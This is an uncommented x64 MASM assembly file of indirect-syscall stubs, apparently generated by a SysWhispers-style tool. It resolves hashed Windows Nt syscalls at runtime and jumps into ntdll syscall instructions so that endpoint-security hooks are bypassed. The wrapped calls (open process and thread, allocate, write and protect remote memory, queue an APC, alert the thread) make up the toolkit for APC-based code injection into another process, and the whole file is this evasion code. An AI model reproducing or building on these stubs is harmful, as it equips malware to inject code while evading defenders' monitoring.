.code

EXTERN Qn3_ResolveSyscallId: PROC
EXTERN Qn3_PickSyscallStub:  PROC

Qn3_NtOpenProcess PROC
    push rbx
    push rcx
    push rdx
    push r8
    push r9
    sub  rsp, 20h
    mov  ecx, 00DBF0A2Ch
    call Qn3_PickSyscallStub
    mov  rbx, rax
    mov  ecx, 00DBF0A2Ch
    call Qn3_ResolveSyscallId
    mov  r11, rbx
    add  rsp, 20h
    pop  r9
    pop  r8
    pop  rdx
    pop  rcx
    pop  rbx
    mov  r10, rcx
    jmp  r11
Qn3_NtOpenProcess ENDP

Qn3_NtOpenThread PROC
    push rbx
    push rcx
    push rdx
    push r8
    push r9
    sub  rsp, 20h
    mov  ecx, 01ABD441Fh
    call Qn3_PickSyscallStub
    mov  rbx, rax
    mov  ecx, 01ABD441Fh
    call Qn3_ResolveSyscallId
    mov  r11, rbx
    add  rsp, 20h
    pop  r9
    pop  r8
    pop  rdx
    pop  rcx
    pop  rbx
    mov  r10, rcx
    jmp  r11
Qn3_NtOpenThread ENDP

Qn3_NtAllocateVirtualMemory PROC
    push rbx
    push rcx
    push rdx
    push r8
    push r9
    sub  rsp, 20h
    mov  ecx, 00388131Fh
    call Qn3_PickSyscallStub
    mov  rbx, rax
    mov  ecx, 00388131Fh
    call Qn3_ResolveSyscallId
    mov  r11, rbx
    add  rsp, 20h
    pop  r9
    pop  r8
    pop  rdx
    pop  rcx
    pop  rbx
    mov  r10, rcx
    jmp  r11
Qn3_NtAllocateVirtualMemory ENDP

Qn3_NtWriteVirtualMemory PROC
    push rbx
    push rcx
    push rdx
    push r8
    push r9
    sub  rsp, 20h
    mov  ecx, 012991C10h
    call Qn3_PickSyscallStub
    mov  rbx, rax
    mov  ecx, 012991C10h
    call Qn3_ResolveSyscallId
    mov  r11, rbx
    add  rsp, 20h
    pop  r9
    pop  r8
    pop  rdx
    pop  rcx
    pop  rbx
    mov  r10, rcx
    jmp  r11
Qn3_NtWriteVirtualMemory ENDP

Qn3_NtProtectVirtualMemory PROC
    push rbx
    push rcx
    push rdx
    push r8
    push r9
    sub  rsp, 20h
    mov  ecx, 00E93061Ch
    call Qn3_PickSyscallStub
    mov  rbx, rax
    mov  ecx, 00E93061Ch
    call Qn3_ResolveSyscallId
    mov  r11, rbx
    add  rsp, 20h
    pop  r9
    pop  r8
    pop  rdx
    pop  rcx
    pop  rbx
    mov  r10, rcx
    jmp  r11
Qn3_NtProtectVirtualMemory ENDP

Qn3_NtQueueApcThread PROC
    push rbx
    push rcx
    push rdx
    push r8
    push r9
    sub  rsp, 20h
    mov  ecx, 0BCAE3B8Dh
    call Qn3_PickSyscallStub
    mov  rbx, rax
    mov  ecx, 0BCAE3B8Dh
    call Qn3_ResolveSyscallId
    mov  r11, rbx
    add  rsp, 20h
    pop  r9
    pop  r8
    pop  rdx
    pop  rcx
    pop  rbx
    mov  r10, rcx
    jmp  r11
Qn3_NtQueueApcThread ENDP

Qn3_NtAlertThread PROC
    push rbx
    push rcx
    push rdx
    push r8
    push r9
    sub  rsp, 20h
    mov  ecx, 0399EF53Eh
    call Qn3_PickSyscallStub
    mov  rbx, rax
    mov  ecx, 0399EF53Eh
    call Qn3_ResolveSyscallId
    mov  r11, rbx
    add  rsp, 20h
    pop  r9
    pop  r8
    pop  rdx
    pop  rcx
    pop  rbx
    mov  r10, rcx
    jmp  r11
Qn3_NtAlertThread ENDP

Qn3_NtClose PROC
    push rbx
    push rcx
    push rdx
    push r8
    push r9
    sub  rsp, 20h
    mov  ecx, 01A942CCFh
    call Qn3_PickSyscallStub
    mov  rbx, rax
    mov  ecx, 01A942CCFh
    call Qn3_ResolveSyscallId
    mov  r11, rbx
    add  rsp, 20h
    pop  r9
    pop  r8
    pop  rdx
    pop  rcx
    pop  rbx
    mov  r10, rcx
    jmp  r11
Qn3_NtClose ENDP

end
